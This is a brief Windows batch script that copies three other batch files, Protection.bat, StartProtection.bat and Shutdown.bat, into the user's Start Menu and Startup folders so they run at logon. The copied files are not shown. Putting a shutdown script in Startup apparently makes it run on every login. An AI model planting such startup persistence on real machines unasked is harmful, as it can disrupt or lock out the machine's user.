@ECHO OFF 
COPY Protection.bat %appdata%\Microsoft\Windows\"Start Menu"\Programs\
COPY StartProtection.bat %appdata%\Microsoft\Windows\"Start Menu"\Programs\Startup\
COPY Shutdown.bat %appdata%\Microsoft\Windows\"Start Menu"\Programs\Startup\
PING localhost -n 2 > NUL
